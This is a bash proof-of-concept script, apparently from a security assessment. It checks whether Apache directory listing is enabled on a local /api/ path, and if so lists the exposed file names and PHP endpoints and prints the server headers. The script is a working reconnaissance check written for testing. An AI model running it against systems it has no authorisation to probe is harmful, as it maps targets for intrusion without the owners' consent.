#!/bin/bash

# POC: Apache Directory Listing Information Disclosure on /api/
# This script demonstrates the vulnerability where Apache directory indexing
# is enabled, allowing enumeration of API files and structure

TARGET="http://localhost:8080/api/"

echo "=================================================="
echo "Apache Directory Listing Information Disclosure POC"
echo "=================================================="
echo ""
echo "Target: $TARGET"
echo ""

# Check if the target is reachable
echo "[*] Testing connectivity to target..."
if ! curl -s -m 5 "$TARGET" > /dev/null 2>&1; then
    echo "[-] Error: Cannot reach target $TARGET"
    exit 1
fi

echo "[+] Target is reachable"
echo ""

# Fetch the directory listing
echo "[*] Fetching directory listing from $TARGET..."
RESPONSE=$(curl -s "$TARGET")

# Check if we got an Apache index page
if echo "$RESPONSE" | grep -q "Index of /api"; then
    echo "[+] VULNERABLE: Apache directory listing is ENABLED"
    echo ""
    echo "[*] Directory listing contents:"
    echo "---"
    
    # Extract the table rows containing file information
    echo "$RESPONSE" | grep -oP '(?<=<a href=")[^"]+|(?<=<td><a href="[^"]*">)[^<]+|(\d+\.\d+K|\d+ B)' | head -20
    
    echo "---"
    echo ""
    
    # Parse and display file information
    echo "[*] Identified PHP files accessible in /api/:"
    echo "$RESPONSE" | grep -oP '(?<=<a href=")?[^"]*\.php(?=")' | sort -u | while read file; do
        if [ -n "$file" ]; then
            echo "    - $file"
        fi
    done
    
    echo ""
    echo "[*] HTTP Response Headers:"
    curl -s -I "$TARGET" | head -10
    
    echo ""
    echo "[+] VULNERABILITY CONFIRMED:"
    echo "    - Directory indexing enabled on /api/"
    echo "    - All files and structure are enumerable"
    echo "    - Attackers can identify all available endpoints"
    echo "    - File metadata (timestamps, sizes) disclosed"
    
    exit 0
else
    echo "[-] NOT VULNERABLE: Directory listing is not accessible"
    echo "    Server returned different response (likely 403 Forbidden)"
    exit 1
fi